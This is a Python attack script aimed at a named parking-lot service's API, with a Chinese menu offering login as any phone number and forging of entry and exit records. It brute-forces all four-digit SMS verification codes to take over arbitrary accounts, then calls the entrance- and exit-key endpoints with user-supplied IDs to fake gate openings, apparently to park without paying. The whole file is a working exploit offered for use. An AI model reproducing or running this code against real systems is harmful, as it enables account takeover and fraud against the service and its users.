#!/usr/bin/env python
# coding=utf-8

import sys
import requests
import json

BASE_URL = 'http://chargerest.park1.cn/BackgroundApp1'

def getVericode(phone):
	response = requests.post(
		url = BASE_URL + '/register/v1_2/getVericode.do',
		data = '{"phone":"%s"}' % phone
	)

	if response.json()['errorcode'] != 0:
		print('验证码发送失败\n')
		return False
	else:
		print('验证码已发送\n')
		return True

def registerUser(phone, code):
	response = requests.post(
		url = BASE_URL + '/register/v1_2/registerUser.do',
		data = '{"phone":"%s","vericode":"%04d"}' % (phone, code)
	)

	return response

def login():
	phone = input('手机号: ')
	if (getVericode(phone) == False):
		return

	# code = input('验证码: ')

	for code in range(0, 9999):
		sys.stdout.write('\r%s/9999'%code)
		sys.stdout.flush()

		response = registerUser(phone, code)

		if len(response.text) == 0:
			print('操作失败\n')
			break
		elif response.json()['errorcode'] == 0 or response.json()['errorcode'] == 4:
			print('\n登录成功: \n')
			print(json.dumps(response.json(), ensure_ascii=False, indent=2))
			break

def getExportKey(userPhoneId, carParkId):
	response = requests.post(
		url = BASE_URL + '/parkingExport/v1_2/getExportKey.do',
		data = '{"userPhoneId": "%s", "carParkId": %s}' % (userPhoneId, carParkId)
	)

	return response

def exportOpenSuccess(userPhoneId, carParkId):
	response = requests.post(
		url = BASE_URL + '/parkingExport/v1_2/exportOpenSuccess.do',
		data = '{"userPhoneId": "%s", "carParkId": %s}' % (userPhoneId, carParkId)
	)

	return response

def getEntranceKey(userPhoneId, carParkId):
	response = requests.post(
		url = BASE_URL + '/parkingEntrance/v1_2/getEntranceKey.do',
		data = '{"userPhoneId": "%s", "carParkId": %s}' % (userPhoneId, carParkId)
	)

	return response

def entranceOpenSuccess(userPhoneId, carParkId):
	response = requests.post(
		url = BASE_URL + '/parkingEntrance/v1_2/entranceOpenSuccess.do',
		data = '{"userPhoneId": "%s", "carParkId": %s}' % (userPhoneId, carParkId)
	)

	return response

def park(flag):
	userPhoneId = raw_input('userPhoneId: ')
	carParkId = input('carParkId: ')

	if flag == 0:
		getKey = getEntranceKey
		openSuccess = entranceOpenSuccess
	else:
		getKey = getExportKey
		openSuccess = exportOpenSuccess

	response = getKey(userPhoneId, carParkId)
	if len(response.text) > 0:
		print(json.dumps(response.json(), ensure_ascii=False, indent=2))

		response = openSuccess(userPhoneId, carParkId)
		if len(response.text) > 0:
			print(json.dumps(response.json(), ensure_ascii=False, indent=2))

def main():
	print('1.任意手机号登录\n2.伪造入场记录\n3.伪造出场记录')
	number = input('请选择: ')
	if number == 1:
		login()
	elif number == 2:
		park(0)
	elif number == 3:
		park(1)

if __name__ == '__main__':
	main()